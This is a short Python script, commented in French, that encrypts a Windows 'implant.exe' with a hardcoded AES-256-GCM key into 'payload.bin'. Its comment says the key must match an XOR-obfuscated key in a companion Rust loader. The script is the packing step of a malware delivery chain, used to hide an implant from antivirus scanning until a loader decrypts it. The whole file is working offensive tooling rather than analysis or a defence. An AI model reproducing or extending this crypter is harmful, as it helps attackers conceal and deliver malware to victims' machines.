#!/usr/bin/env python3
"""Chiffre implant.exe en AES-256-GCM → payload.bin (nonce || ciphertext)"""
import sys, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Clé AES — doit correspondre à OBF_KEY XOR 0xA3 dans loader/src/main.rs
AES_KEY = bytes.fromhex("b5bf115448dbd4dcbb5f8094cbf6c7111cb5b950831d31e1f52551d8758f4693")

def encrypt(src: str, dst: str):
    with open(src, "rb") as f:
        plaintext = f.read()
    nonce = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    with open(dst, "wb") as f:
        f.write(nonce + ciphertext)
    print(f"[+] {src} ({len(plaintext)} bytes) → {dst} ({12 + len(ciphertext)} bytes)")

if __name__ == "__main__":
    src = sys.argv[1] if len(sys.argv) > 1 else "target/x86_64-pc-windows-gnu/release/implant.exe"
    dst = sys.argv[2] if len(sys.argv) > 2 else "payload.bin"
    encrypt(src, dst)
